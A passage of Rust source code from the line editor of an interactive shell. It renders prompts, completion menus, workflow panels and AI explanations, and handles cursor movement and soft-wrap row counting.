                    out.queue(SetAttribute(Attribute::Underlined))?;
                }
                // Handle newlines within spans — insert continuation prompt
                let lines: Vec<&str> = span.text.split('\n').collect();
                for (li, line) in lines.iter().enumerate() {
                    out.queue(Print(line))?;
                    if li < lines.len() - 1 {
                        out.queue(ResetColor)?;
                        out.queue(SetAttribute(Attribute::Reset))?;
                        out.queue(Print("\r\n"))?;
                        out.queue(Print(&cont_prompt))?;
                        // Rows are accounted by `input_geometry` below, which
                        // also sees the soft wraps this count would miss.
                        // Re-apply colors for next segment
                        if let Some(color) = span.fg {
                            out.queue(SetForegroundColor(color))?;
                        }
                        if span.bold {
                            out.queue(SetAttribute(Attribute::Bold))?;
                        }
                    }
                }
                out.queue(ResetColor)?;
                out.queue(SetAttribute(Attribute::Reset))?;
            }

            // Render right prompt on first line if there's room
            let rprompt = prompt::render_rprompt(state);
            let rprompt_w = prompt::rprompt_width(state);
            if rprompt_w > 0 {
                let first_line = self.buffer.split('\n').next().unwrap_or("");
                let prompt_last = self
                    .cached_prompt
                    .rsplit('\n')
                    .next()
                    .unwrap_or(&self.cached_prompt);
                let content_width = display_width(prompt_last) + display_width(first_line);
                let available = self.terminal_width as usize;
                if content_width + rprompt_w + 2 < available {
                    out.queue(cursor::SavePosition)?;
                    out.queue(MoveToColumn((available - rprompt_w) as u16))?;
                    out.queue(Print(&rprompt))?;
                    out.queue(cursor::RestorePosition)?;
                }
            }

            // Render suggestion (ghost text)
            if let Some(ref suggestion) = self.suggestion {
                if self.cursor == self.buffer.len() {
                    out.queue(SetForegroundColor(Color::DarkGrey))?;
                    out.queue(Print(suggestion))?;
                    out.queue(ResetColor)?;
                }
            }

            // Caret position and input-row count, soft-wrap aware. The ghost
            // widens the last line (rows the clear must cover) but sits past
            // the caret, so it never moves the caret itself.
            let ghost_width = match &self.suggestion {
                Some(suggestion) if self.cursor == self.buffer.len() => display_width(suggestion),
                _ => 0,
            };
            let geometry = input_geometry(
                prompt_width,
                display_width(&cont_prompt),
                &self.buffer,
                self.cursor,
                ghost_width,
                self.terminal_width,
            );
            rendered_lines += geometry.extra_rows;
            cursor_row = rows_above_input + geometry.cursor_row;
            cursor_col = geometry.cursor_col;

            if let Some(ref explanation) = self.ai_explanation {
                out.queue(Print("\r\n"))?;
                out.queue(SetForegroundColor(Color::Cyan))?;
                out.queue(SetAttribute(Attribute::Bold))?;
                out.queue(Print("AI explanation"))?;
                out.queue(ResetColor)?;
                out.queue(SetAttribute(Attribute::Reset))?;
                rendered_lines += 1;
                for line in explanation.split('\n') {
                    out.queue(Print("\r\n"))?;
                    out.queue(SetForegroundColor(Color::DarkGrey))?;
                    out.queue(Print(line))?;
                    out.queue(ResetColor)?;
                    rendered_lines += 1 + wrap_extra_rows(display_width(line), self.terminal_width);
                }
            } else if let Some(ref error) = self.ai_error {
                out.queue(Print("\r\n"))?;
                out.queue(SetForegroundColor(Color::Red))?;
                out.queue(Print(error))?;
                out.queue(ResetColor)?;
                rendered_lines += 1 + wrap_extra_rows(display_width(error), self.terminal_width);
            // Phase 16d — signature hint line below the input. Only when nothing
            // else owns this slot: no completion menu, widget mode, AI explanation,
            // or AI error.
            } else if show_signature_hint
                && self.completion_menu.is_none()
                && self.workflow_mode.is_none()
                && self.search_mode.is_none()
            {
                if let Some(hint) =
                    crate::signature::hint_for(&self.buffer, self.cursor, &state.user_signatures)
                {
                    out.queue(Print("\r\n"))?;
                    out.queue(Print(&hint))?;
                    rendered_lines +=
                        1 + wrap_extra_rows(display_width(&hint), self.terminal_width);
                }
            }
        }

        // Render completion menu if active
        if let Some(ref menu) = self.completion_menu {
            out.queue(Print("\r\n"))?;
            rendered_lines += 1;

            // Group completions by kind for better organization
            let mut builtins = Vec::new();
            let mut aliases = Vec::new();
            let mut functions = Vec::new();
            let mut subcommands = Vec::new();
            let mut flags = Vec::new();
            let mut dirs = Vec::new();
            let mut files = Vec::new();
            let mut variables = Vec::new();
            let mut commands = Vec::new();
            let mut others = Vec::new();

            for comp in &menu.completions {
                match comp.kind {
                    CompletionKind::Builtin => builtins.push(comp),
                    CompletionKind::Alias => aliases.push(comp),
                    CompletionKind::Function => functions.push(comp),
                    CompletionKind::Subcommand => subcommands.push(comp),
                    CompletionKind::Flag => flags.push(comp),
                    CompletionKind::Directory => dirs.push(comp),
                    CompletionKind::File => files.push(comp),
                    CompletionKind::Variable => variables.push(comp),
                    CompletionKind::Command => commands.push(comp),
                    CompletionKind::Other => others.push(comp),
                }
            }

            // Render grouped completions with type badges
            let groups: Vec<(&str, &str, Vec<&Completion>)> = vec![
                ("S", "Subcommands", subcommands),
                ("F", "Flags", flags),
                ("/", "Directories", dirs),
                (".", "Files", files),
                ("$", "Variables", variables),
                ("B", "Builtins", builtins),
                ("A", "Aliases", aliases),
                ("f", "Functions", functions),
                ("C", "Commands", commands),
                ("*", "Others", others),
            ];

            // Flatten groups into ordered items with badge info
            let non_empty_groups: Vec<_> = groups
                .iter()
                .filter(|(_, _, items)| !items.is_empty())
                .collect();
            let single_group = non_empty_groups.len() == 1;

            struct FlatItem<'a> {
                comp: &'a Completion,
                badge: &'a str,
                group_start: bool,
                group_header: &'a str,
            }
            let mut flat_items: Vec<FlatItem> = Vec::new();
            for (badge, header, items) in &groups {
                if items.is_empty() {
                    continue;
                }
                for (i, comp) in items.iter().enumerate() {
                    flat_items.push(FlatItem {
                        comp,
                        badge,
                        group_start: i == 0 && !single_group,
                        group_header: header,
                    });
                }
            }

            let total = flat_items.len();
            let max_visible = (self.terminal_height as usize / 2).max(5).min(total);

            // Compute scroll window to keep selected item visible
            let scroll_offset = if menu.selected < max_visible / 2 {
                0
            } else if menu.selected + max_visible / 2 >= total {
                total.saturating_sub(max_visible)
            } else {
                menu.selected - max_visible / 2
            };

            // Where the selection sits in the whole list. With scrolling, the
            // visible rows alone never say how much there is to choose from.
            if total > max_visible {
                out.queue(SetAttribute(Attribute::Dim))?;
                out.queue(SetForegroundColor(Color::DarkGrey))?;
                out.queue(Print(format!("  {}/{} matches", menu.selected + 1, total)))?;
                out.queue(ResetColor)?;
                out.queue(SetAttribute(Attribute::Reset))?;
                out.queue(Print("\r\n"))?;
                rendered_lines += 1;
            }

            // Show "↑ N above" indicator
            if scroll_offset > 0 {
                out.queue(SetAttribute(Attribute::Dim))?;
                out.queue(SetForegroundColor(Color::DarkGrey))?;
                out.queue(Print(format!("  ↑ {} more above", scroll_offset)))?;
                out.queue(ResetColor)?;
                out.queue(Print("\r\n"))?;
                rendered_lines += 1;
            }

            let mut prev_group_header = "";
            for (idx, item) in flat_items
                .iter()
                .enumerate()
                .skip(scroll_offset)
                .take(max_visible)
            {
                let is_selected = idx == menu.selected;

                // Print group header if this is first item of a new group in visible range
                if !single_group && item.group_start && item.group_header != prev_group_header {
                    if idx > scroll_offset {
                        out.queue(Print("\r\n"))?;
                        rendered_lines += 1;
                    }
                    out.queue(SetForegroundColor(Color::DarkYellow))?;
                    out.queue(SetAttribute(Attribute::Dim))?;
                    out.queue(Print(format!("[{}] ", item.badge)))?;
                    out.queue(SetForegroundColor(Color::Cyan))?;
                    out.queue(Print(item.group_header))?;
                    out.queue(ResetColor)?;
                    out.queue(Print("\r\n"))?;
                    rendered_lines += 1;
                }
                if !single_group {
                    prev_group_header = item.group_header;
                }

                // Type badge
                if !is_selected {
                    out.queue(SetForegroundColor(Color::DarkYellow))?;
                    out.queue(SetAttribute(Attribute::Dim))?;
                }
                if single_group {
                    out.queue(Print(format!("{} ", item.badge)))?;
                } else {
                    out.queue(Print("  "))?;
                }
                if !is_selected {
                    out.queue(ResetColor)?;
                }

                // Highlight selected item
                if is_selected {
                    out.queue(SetBackgroundColor(Color::Rgb {
                        r: 50,
                        g: 50,
                        b: 80,
                    }))?;
                    out.queue(SetForegroundColor(Color::White))?;
                    out.queue(SetAttribute(Attribute::Bold))?;
                } else if item.comp.is_dir {
                    out.queue(SetForegroundColor(Color::Blue))?;
                }

                // Display name, with the characters the typed text matched
                // underlined — a fuzzy match is otherwise unexplained, and
                // `chk` landing on `checkout` looks arbitrary without it.
                let name_width = 20usize.min(self.terminal_width as usize / 3);
                let (display_name, display_name_width) =
                    history_panel_text(&item.comp.display, name_width);
                let matched = completer::match_positions(&display_name, &menu.original_word);
                if matched.is_empty() {
                    out.queue(Print(display_name))?;
                } else {
                    for (offset, ch) in display_name.char_indices() {
                        if matched.contains(&offset) {
                            out.queue(SetAttribute(Attribute::Underlined))?;
                            out.queue(Print(ch))?;
                            out.queue(SetAttribute(Attribute::NoUnderline))?;
                        } else {
                            out.queue(Print(ch))?;
                        }
                    }
                }
                out.queue(Print(
                    " ".repeat(name_width.saturating_sub(display_name_width)),
                ))?;

                if is_selected {
                    out.queue(SetBackgroundColor(Color::Reset))?;
                    out.queue(ResetColor)?;
                    out.queue(SetAttribute(Attribute::Reset))?;
                } else if item.comp.is_dir {
                    out.queue(ResetColor)?;
                }

                // Description, after the name. The selected row keeps its
                // description too — it is the one whose meaning is being
                // asked for — but undimmed, so the highlight stays readable.
                if let Some(ref d) = item.comp.description {
                    // Generic kind labels repeat the badge; the badge said it.
                    if d != "builtin" && d != "alias" && d != "function" {
                        if is_selected {
                            out.queue(SetForegroundColor(Color::Cyan))?;
                        } else {
                            out.queue(SetAttribute(Attribute::Dim))?;
                            out.queue(SetForegroundColor(Color::White))?;
                        }
                        let max_desc =
                            (self.terminal_width as usize).saturating_sub(name_width + 5);
                        let (description, _) = history_panel_text(d, max_desc);
                        out.queue(Print(description))?;
                        out.queue(ResetColor)?;
                        out.queue(SetAttribute(Attribute::Reset))?;
                    }
                }

                out.queue(Print("\r\n"))?;
                rendered_lines += 1;
            }

            // Show "↓ N below" indicator
            let items_below = total.saturating_sub(scroll_offset + max_visible);
            if items_below > 0 {
                out.queue(SetAttribute(Attribute::Dim))?;
                out.queue(SetForegroundColor(Color::DarkGrey))?;
                out.queue(Print(format!("  ↓ {} more below", items_below)))?;
                out.queue(ResetColor)?;
                out.queue(Print("\r\n"))?;
                rendered_lines += 1;
            }
        }

        // Render workflow panel if active
        if let Some(ref wf_mode) = self.workflow_mode {
            out.queue(Print("\r\n"))?;
            rendered_lines += 1;

            if let Some(ref session) = wf_mode.session {
                let workflow = session.workflow();
                let parameter = session.current_placeholder();
                out.queue(SetForegroundColor(Color::Magenta))?;
                out.queue(SetAttribute(Attribute::Bold))?;
                out.queue(Print(" WORKFLOW "))?;
                out.queue(ResetColor)?;
                out.queue(SetForegroundColor(Color::Yellow))?;
                let progress = format!(
                    " [{}/{}]",
                    session.current_index() + 1,
                    session.parameter_count()
                );
                let max_name_width = (self.terminal_width as usize)
                    .saturating_sub(display_width(" WORKFLOW ") + display_width(&progress));
                let (workflow_name, _) = history_panel_text(&workflow.name, max_name_width);
                let header = format!("{workflow_name}{progress}");
                out.queue(Print(&header))?;
                out.queue(ResetColor)?;
                out.queue(Print("\r\n"))?;
                rendered_lines += 1 + wrap_extra_rows(
                    display_width(" WORKFLOW ") + display_width(&header),
                    self.terminal_width,
                );

                if let Some(parameter) = parameter {
                    let parameter_prefix = "  ";
                    let max_parameter_width = (self.terminal_width as usize)
                        .saturating_sub(display_width(parameter_prefix));
                    let (parameter_name, parameter_width) =
                        history_panel_text(&parameter.name, max_parameter_width);
                    out.queue(SetForegroundColor(Color::Cyan))?;
                    out.queue(SetAttribute(Attribute::Bold))?;
                    out.queue(Print(format!("{parameter_prefix}{parameter_name}")))?;
                    out.queue(ResetColor)?;
                    let mut parameter_line_width =
                        display_width(parameter_prefix) + parameter_width;
                    if let Some(description) = parameter.description.as_deref() {
                        let separator = " — ";
                        let separator_width = display_width(separator);
                        let max_description = (self.terminal_width as usize)
                            .saturating_sub(parameter_line_width + separator_width);
                        let (description, description_width) =
                            history_panel_text(description, max_description);
                        if !description.is_empty() {
                            out.queue(SetAttribute(Attribute::Dim))?;
                            out.queue(Print(format!("{separator}{description}")))?;
                            out.queue(SetAttribute(Attribute::Reset))?;
                            parameter_line_width += separator_width + description_width;
                        }
                    }
                    out.queue(Print("\r\n"))?;
                    rendered_lines +=
                        1 + wrap_extra_rows(parameter_line_width, self.terminal_width);

                    if let Some(default) = parameter.default.as_deref() {
                        let (default, _) = history_panel_text(
                            default,
                            (self.terminal_width as usize).saturating_sub(13),
                        );
                        let line = format!("  default: {default}");
                        out.queue(SetForegroundColor(Color::DarkGrey))?;
                        out.queue(Print(&line))?;
                        out.queue(ResetColor)?;
                        out.queue(Print("\r\n"))?;
                        rendered_lines +=
                            1 + wrap_extra_rows(display_width(&line), self.terminal_width);
                    }

                    let value = session.current_value().unwrap_or_default();
                    let (value, _) =
                        history_panel_text(value, (self.terminal_width as usize).saturating_sub(5));
                    let line = format!("  ❯ {value}");
                    out.queue(SetForegroundColor(Color::Green))?;
                    out.queue(SetAttribute(Attribute::Bold))?;
                    out.queue(Print(&line))?;
                    out.queue(ResetColor)?;
                    out.queue(Print("\r\n"))?;
                    rendered_lines +=
                        1 + wrap_extra_rows(display_width(&line), self.terminal_width);

                    if !parameter.suggestions.is_empty() {
                        let total = parameter.suggestions.len();
                        let selected = wf_mode.suggestion_selected.unwrap_or(0).min(total - 1);
                        let max_visible = 5usize.min(total);
                        let offset = centered_scroll_offset(selected, total, max_visible);
                        out.queue(SetForegroundColor(Color::DarkGrey))?;
                        out.queue(Print("  suggestions (Tab/↑/↓):"))?;
                        out.queue(ResetColor)?;
                        out.queue(Print("\r\n"))?;
                        rendered_lines += 1 + wrap_extra_rows(
                            display_width("  suggestions (Tab/↑/↓):"),
                            self.terminal_width,
                        );
                        for (index, suggestion) in parameter
                            .suggestions
                            .iter()
                            .enumerate()
                            .skip(offset)
                            .take(max_visible)
                        {
                            let selected = wf_mode.suggestion_selected == Some(index);
                            if selected {
                                out.queue(SetBackgroundColor(Color::Rgb {
                                    r: 50,
                                    g: 50,
                                    b: 80,
                                }))?;
                                out.queue(SetForegroundColor(Color::White))?;
                                out.queue(SetAttribute(Attribute::Bold))?;
                            } else {
                                out.queue(SetForegroundColor(Color::DarkGrey))?;
                            }
                            let (suggestion, _) = history_panel_text(
                                suggestion,
                                (self.terminal_width as usize).saturating_sub(6),
                            );
                            let line = format!("    {suggestion}");
                            out.queue(Print(&line))?;
                            out.queue(SetBackgroundColor(Color::Reset))?;
                            out.queue(ResetColor)?;
                            out.queue(SetAttribute(Attribute::Reset))?;
                            out.queue(Print("\r\n"))?;
                            rendered_lines +=
                                1 + wrap_extra_rows(display_width(&line), self.terminal_width);
                        }
                    }

                    if let Ok(preview) = session.preview() {
                        let (preview, _) = history_panel_text(
                            &preview,
                            (self.terminal_width as usize).saturating_sub(12),
                        );
                        let line = format!("  command: {preview}");
                        out.queue(SetForegroundColor(Color::DarkGrey))?;
                        out.queue(Print(&line))?;
                        out.queue(ResetColor)?;
                        out.queue(Print("\r\n"))?;
                        rendered_lines +=
                            1 + wrap_extra_rows(display_width(&line), self.terminal_width);
                    }
                }
            } else {
                let total = wf_mode.results.len();
                let position = if total == 0 {
                    0
                } else {
                    wf_mode.selected.min(total - 1) + 1
                };
                out.queue(SetForegroundColor(Color::Magenta))?;
                out.queue(SetAttribute(Attribute::Bold))?;
                out.queue(Print(" WORKFLOWS "))?;
                out.queue(ResetColor)?;
                out.queue(SetForegroundColor(Color::Yellow))?;
                let progress = format!("[{position}/{total}] ");
                out.queue(Print(&progress))?;
                out.queue(ResetColor)?;
                let query_prefix = "❯ ";
                let fixed_width = display_width(" WORKFLOWS ")
                    + display_width(&progress)
                    + display_width(query_prefix);
                let query_width = panel_remaining_width(
                    self.terminal_width,
                    &[" WORKFLOWS ", &progress, query_prefix],
                );
                let (query, _) = history_panel_text(&wf_mode.query, query_width);
                out.queue(Print(format!("{query_prefix}{query}")))?;
                out.queue(Print("\r\n"))?;
                rendered_lines +=
                    1 + wrap_extra_rows(fixed_width + display_width(&query), self.terminal_width);

                let max_show = 10usize
                    .min((self.terminal_height as usize / 3).max(1))
                    .min(total);
                let scroll_offset = centered_scroll_offset(wf_mode.selected, total, max_show);
                if scroll_offset > 0 {
                    let line = format!("  ↑ {scroll_offset} more above");
                    out.queue(SetForegroundColor(Color::DarkGrey))?;
                    out.queue(Print(&line))?;
                    out.queue(ResetColor)?;
                    out.queue(Print("\r\n"))?;
                    rendered_lines +=
                        1 + wrap_extra_rows(display_width(&line), self.terminal_width);
                }

                for (index, workflow) in wf_mode
                    .results
                    .iter()
                    .enumerate()
                    .skip(scroll_offset)
                    .take(max_show)
                {
                    let selected = index == wf_mode.selected;
                    if selected {
                        out.queue(SetBackgroundColor(Color::Rgb {
                            r: 50,
                            g: 50,
                            b: 80,
                        }))?;
                        out.queue(SetForegroundColor(Color::White))?;
                        out.queue(SetAttribute(Attribute::Bold))?;
                        out.queue(Print("▸ "))?;
                    } else {
                        out.queue(Print("  "))?;
                        out.queue(SetForegroundColor(Color::Cyan))?;
                    }
                    let marker_width = display_width("▸ ");
                    let available = (self.terminal_width as usize).saturating_sub(marker_width);
                    let name_column = 20usize.min(available);
                    let (name, name_width) = history_panel_text(&workflow.name, name_column);
                    out.queue(Print(name))?;
                    out.queue(Print(" ".repeat(name_column.saturating_sub(name_width))))?;
                    let max_description = available.saturating_sub(name_column);
                    let (description, description_width) =
                        history_panel_text(&workflow.description, max_description);
                    if !selected {
                        out.queue(SetAttribute(Attribute::Dim))?;
                    }
                    out.queue(Print(description))?;
                    out.queue(SetBackgroundColor(Color::Reset))?;
                    out.queue(ResetColor)?;
                    out.queue(SetAttribute(Attribute::Reset))?;
                    out.queue(Print("\r\n"))?;
                    rendered_lines += 1 + wrap_extra_rows(
                        marker_width + name_column + description_width,
                        self.terminal_width,
                    );

                    if selected {
                        let (preview, _) = history_panel_text(
                            &workflow.command,
                            (self.terminal_width as usize).saturating_sub(6),
                        );
                        let line = format!("    {preview}");
                        out.queue(SetForegroundColor(Color::DarkGrey))?;
                        out.queue(Print(&line))?;
                        out.queue(ResetColor)?;
                        out.queue(Print("\r\n"))?;
                        rendered_lines +=
                            1 + wrap_extra_rows(display_width(&line), self.terminal_width);
                    }
                }

                let below = total.saturating_sub(scroll_offset + max_show);
                if below > 0 {
                    let line = format!("  ↓ {below} more below");
                    out.queue(SetForegroundColor(Color::DarkGrey))?;
                    out.queue(Print(&line))?;
                    out.queue(ResetColor)?;
                    out.queue(Print("\r\n"))?;
                    rendered_lines +=
                        1 + wrap_extra_rows(display_width(&line), self.terminal_width);
                }
            }
        }

        let go_up = rendered_lines.saturating_sub(cursor_row);
        if go_up > 0 {
            out.queue(MoveUp(go_up))?;
        }
        out.queue(MoveToColumn(cursor_col))?;

        self.last_rendered_lines = rendered_lines;
        self.last_cursor_row = cursor_row;
        out.flush()?;
        Ok(())
    }

    // Character/cursor helpers

    fn move_right(&mut self) {
        if self.cursor < self.buffer.len() {
            let c = self.buffer[self.cursor..].chars().next().unwrap();
            self.cursor += c.len_utf8();
        }
    }

    fn move_left(&mut self) {
        if self.cursor > 0 {
            self.cursor = self.prev_char_boundary();
        }
    }

    fn prev_char_boundary(&self) -> usize {
        let mut pos = self.cursor - 1;
        while pos > 0 && !self.buffer.is_char_boundary(pos) {
            pos -= 1;
        }
        pos
    }

    fn last_line_start(&self) -> usize {
        match self.buffer[..self.cursor].rfind('\n') {
            Some(pos) => pos + 1,
            None => 0,
        }
    }

    fn current_line_end(&self) -> usize {
        match self.buffer[self.cursor..].find('\n') {
            Some(pos) => self.cursor + pos,
            None => self.buffer.len(),
        }
    }

    fn prev_word_boundary(&self) -> usize {
        let buf = &self.buffer[..self.cursor];
        let trimmed = buf.trim_end();
        match trimmed.rfind([' ', '\t', '/']) {
            Some(pos) => pos + 1,
            None => 0,
        }
    }

    fn next_word_boundary(&self) -> usize {
        let after = &self.buffer[self.cursor..];
        // Skip current word characters, then skip separators
        let mut chars = after.char_indices();
        // Skip non-separator chars first
        let mut found_sep = false;
        for (i, c) in &mut chars {
            if c == ' ' || c == '\t' || c == '/' {
                found_sep = true;
            } else if found_sep {
                return self.cursor + i;
            }
        }
        self.buffer.len()
    }

    fn delete_char(&mut self) {
        if self.cursor < self.buffer.len() {
            let c = self.buffer[self.cursor..].chars().next().unwrap();
            self.buffer.drain(self.cursor..self.cursor + c.len_utf8());
        }
    }

    // Multiline cursor movement

    fn current_line_col(&self) -> (usize, usize) {
        let before = &self.buffer[..self.cursor];
        match before.rfind('\n') {
            Some(nl) => (nl + 1, display_width_raw(&before[nl + 1..])),
            None => (0, display_width_raw(before)),
        }
    }

    fn move_cursor_up(&mut self) {
        let (line_start, col) = self.current_line_col();
        if line_start == 0 {
            return;
        }
        let prev_nl = self.buffer[..line_start - 1]
            .rfind('\n')
            .map(|p| p + 1)
            .unwrap_or(0);
        let prev_line = &self.buffer[prev_nl..line_start - 1];
        let target_col = col.min(display_width_raw(prev_line));
        // Walk chars until we reach target display column
        let mut current_col = 0;
        let mut byte_offset = 0;
        for c in prev_line.chars() {
            if current_col >= target_col {
                break;
            }
            current_col += char_width(c);
            byte_offset += c.len_utf8();
        }
        self.cursor = prev_nl + byte_offset;
    }

    fn move_cursor_down(&mut self) {
        let (_line_start, col) = self.current_line_col();
        let next_nl = self.buffer[self.cursor..].find('\n');
        if next_nl.is_none() {
            return;
        }
        let next_line_start = self.cursor + next_nl.unwrap() + 1;
        let next_line_end = self.buffer[next_line_start..]
            .find('\n')
            .map(|p| next_line_start + p)
            .unwrap_or(self.buffer.len());
        let next_line = &self.buffer[next_line_start..next_line_end];
        let target_col = col.min(display_width_raw(next_line));
        let mut current_col = 0;
        let mut byte_offset = 0;
        for c in next_line.chars() {
            if current_col >= target_col {
                break;
            }
            current_col += char_width(c);
            byte_offset += c.len_utf8();
        }
        self.cursor = next_line_start + byte_offset;
    }

    // Vi word movement helpers

    fn vi_word_forward(&mut self) {
        let buf = &self.buffer[self.cursor..];
        let mut chars = buf.chars();
        let mut moved = 0;
        // Skip current word (non-whitespace)
        for c in chars.by_ref() {
            moved += c.len_utf8();
            if c.is_whitespace() {
                break;
            }
        }
        // Skip whitespace
        for c in chars {
            if !c.is_whitespace() {
                break;
            }
            moved += c.len_utf8();
        }
        self.cursor = (self.cursor + moved).min(self.buffer.len());
    }

    fn vi_word_backward(&mut self) {
        if self.cursor == 0 {
            return;
        }
        let buf = &self.buffer[..self.cursor];
        let mut pos = self.cursor;
        // Skip trailing whitespace
        for c in buf.chars().rev() {
            if !c.is_whitespace() {
                break;
            }
            pos -= c.len_utf8();
        }
        // Skip word chars
        let buf = &self.buffer[..pos];
        for c in buf.chars().rev() {
            if c.is_whitespace() {
                break;
            }
            pos -= c.len_utf8();
        }
        self.cursor = pos;
    }

    fn vi_word_end(&mut self) {
        if self.cursor >= self.buffer.len() {
            return;
        }
        let start = self.cursor
            + self.buffer[self.cursor..]
                .chars()
                .next()
                .map_or(0, |c| c.len_utf8());
        let buf = &self.buffer[start..];
        let mut moved = 0;
        let mut chars = buf.chars();
        // Skip whitespace
        for c in chars.by_ref() {
            moved += c.len_utf8();
            if !c.is_whitespace() {
                break;
            }
        }
        // Move to end of word
        for c in chars {
            if c.is_whitespace() {
                break;
            }
            moved += c.len_utf8();
        }
        self.cursor = (start + moved).min(self.buffer.len());
    }

    fn prev_char_boundary_from(&self, pos: usize) -> usize {
        if pos == 0 {
            return 0;
        }
        let mut p = pos - 1;
        while p > 0 && !self.buffer.is_char_boundary(p) {
            p -= 1;
        }
        p
    }

    fn is_terminal_dead() -> bool {
        unsafe { libc::isatty(libc::STDIN_FILENO) != 1 }
    }
}

enum KeyAction {
    Continue,
    Submit,
    Eof,
    Interrupt,
}

fn last_error_with_execution_output<F>(
    last_error: Option<(String, String, i32)>,
    execution_id: Option<&str>,
    include_extended_context: bool,
    load_output: F,
) -> Option<(String, String, i32)>
where
    F: FnOnce(&str) -> Option<String>,
{
    let mut last_error = last_error?;
    if !include_extended_context {
        return Some(last_error);
    }
    let Some(execution_id) = execution_id else {
        return Some(last_error);
    };
    let Some(output) = load_output(execution_id).filter(|output| !output.is_empty()) else {
        return Some(last_error);
    };

    last_error.1 = bounded_ai_execution_output(output);
    Some(last_error)
}

fn bounded_ai_execution_output(output: String) -> String {
    if output.len() <= MAX_AI_EXECUTION_OUTPUT_BYTES {
        return output;
    }

    let retained_budget =
        MAX_AI_EXECUTION_OUTPUT_BYTES.saturating_sub(AI_OUTPUT_TRUNCATION_MARKER.len());
    let head_budget = retained_budget / 2;
    let tail_budget = retained_budget - head_budget;

    let mut head_end = head_budget;
    while !output.is_char_boundary(head_end) {
        head_end -= 1;
    }
    let mut tail_start = output.len() - tail_budget;
    while !output.is_char_boundary(tail_start) {
        tail_start += 1;
    }

    let mut bounded = String::with_capacity(MAX_AI_EXECUTION_OUTPUT_BYTES);
    bounded.push_str(&output[..head_end]);
    bounded.push_str(AI_OUTPUT_TRUNCATION_MARKER);
    bounded.push_str(&output[tail_start..]);
    bounded
}

fn format_ai_error(error: &str) -> String {
    use std::fmt::Write as _;

    let mut clean = String::new();
    let mut in_escape = false;
    for ch in error.chars() {
        if in_escape {
            if ch.is_ascii_alphabetic() {
                in_escape = false;
            }
            continue;
        }
        if ch == '\x1b' {
            in_escape = true;
        } else if crate::terminal_text::is_terminal_ambiguous(ch) {
            if ch.is_whitespace() {
                clean.push(' ');
            } else if u32::from(ch) <= 0x7f {
                let _ = write!(clean, "\\x{:02x}", u32::from(ch));
            } else {
                let _ = write!(clean, "\\u{{{:x}}}", u32::from(ch));
            }
        } else {
            clean.push(ch);
        }
        if clean.chars().count() >= 240 {
            break;
        }
    }
    let detail = clean.split_whitespace().collect::<Vec<_>>().join(" ");
    if detail.is_empty() {
        "AI error: request failed".to_string()
    } else {
        format!("AI error: {}", detail)
    }
}

/// Outcome of waiting on stdin: input ready, timed out, or the terminal hung up.
enum StdinPoll {
    Ready,
    Timeout,
    Hangup,
}

/// Compute indentation depth for auto-indent in multiline editing.
fn compute_indent(buffer: &str) -> usize {
    let tokens = crate::parser::lexer::tokenize_lenient(buffer);
    let mut depth: i32 = 0;
    use crate::parser::lexer::Token;
    for t in &tokens {
        match &t.token {
            Token::LBrace | Token::LParen => depth += 1,
            Token::RBrace | Token::RParen => depth -= 1,
            Token::Word(w) => match w.as_str() {
                "do" | "then" => depth += 1,
                "done" | "fi" | "esac" => depth -= 1,
                _ => {}
            },
            _ => {}
        }
    }
    depth.max(0) as usize
}

/// Render one-line history UI text without emitting terminal controls,
/// invisible Unicode formatting, or embedded newlines. Fragments retain the
/// source character's match state so fuzzy-search highlighting remains exact
/// even when one source character expands to an escape such as `\\u{202e}`.
fn history_panel_fragments(
    value: &str,
    matched_indices: &[usize],
    max_width: usize,
) -> (Vec<(String, bool)>, usize) {
    let mut fragments = Vec::new();
    let mut width = 0usize;
    let mut chars = value.chars().enumerate().peekable();
    let mut truncated = false;

    while let Some((index, ch)) = chars.next() {
        let fragment = match ch {
            '\n' => "\\n".to_string(),
            '\t' => "\\t".to_string(),
            '\r' => "\\r".to_string(),
            ch if crate::terminal_text::is_terminal_ambiguous(ch) && u32::from(ch) <= 0x7f => {
                format!("\\x{:02x}", u32::from(ch))
            }
            ch if crate::terminal_text::is_terminal_ambiguous(ch) => {
                format!("\\u{{{:x}}}", u32::from(ch))
            }
            ch => ch.to_string(),
        };
        let fragment_width = display_width_raw(&fragment);
        let ellipsis_reserve = usize::from(chars.peek().is_some());
        if width
            .saturating_add(fragment_width)
            .saturating_add(ellipsis_reserve)
            > max_width
        {
            truncated = true;
            break;
        }
        width += fragment_width;
        fragments.push((fragment, matched_indices.contains(&index)));
    }

    if truncated && width < max_width {
        fragments.push(("…".to_string(), false));
        width += 1;
    }
    (fragments, width)
}

fn history_panel_text(value: &str, max_width: usize) -> (String, usize) {
    let (fragments, width) = history_panel_fragments(value, &[], max_width);
    (
        fragments
            .into_iter()
            .map(|(fragment, _)| fragment)
            .collect(),
        width,
    )
}

/// Calculate display width of a string, stripping ANSI escape sequences.
fn display_width(s: &str) -> usize {
    let mut w = 0;
    let mut in_esc = false;
    for c in s.chars() {
        if in_esc {
            if c.is_ascii_alphabetic() {
                in_esc = false;
            }
        } else if c == '\x1b' {
            in_esc = true;
        } else {
            w += char_width(c);
        }
    }
    w
}

fn panel_remaining_width(term_width: u16, fixed_parts: &[&str]) -> usize {
    let fixed_width = fixed_parts.iter().map(|part| display_width(part)).sum();
    (term_width as usize).saturating_sub(fixed_width)
}

fn char_width(c: char) -> usize {
    if c == '\0' {
        return 0;
    }
    UnicodeWidthChar::width(c).unwrap_or(0)
}

/// Choose a window that keeps `selected` visible and near its centre.
fn centered_scroll_offset(selected: usize, total: usize, visible: usize) -> usize {
    if total == 0 || visible == 0 || visible >= total {
        return 0;
    }
    selected
        .min(total - 1)
        .saturating_sub(visible / 2)
        .min(total - visible)
}

/// Extra terminal rows a line of `width` display columns occupies beyond its
/// first, on a terminal `term_width` columns wide.
///
/// A line exactly as wide as the terminal stays on one row: the wrap is
/// pending until the next glyph arrives, which is also why the caller can add
/// these up per logical line without worrying about the `\r\n` that follows.
fn wrap_extra_rows(width: usize, term_width: u16) -> u16 {
    let columns = term_width.max(1) as usize;
    if width == 0 {
        0
    } else {
        ((width - 1) / columns) as u16
    }
}

/// Rows the cursor ends up below its starting row after printing `text` from
/// column 0: one per hard newline, plus the soft wraps of every over-wide
/// line. ANSI escapes are already excluded by `display_width`.
///
/// This is what the repaint bookkeeping must count. Counting hard newlines
/// alone under-shoots whenever a line exceeds the terminal width — the next
/// repaint's cursor-up then stops short of the top and every keystroke leaves
/// one more stale copy of the prompt on screen.
fn rows_consumed(text: &str, term_width: u16) -> u16 {
    let mut rows: u16 = 0;
    for (index, line) in text.split('\n').enumerate() {
        if index > 0 {
            rows = rows.saturating_add(1);
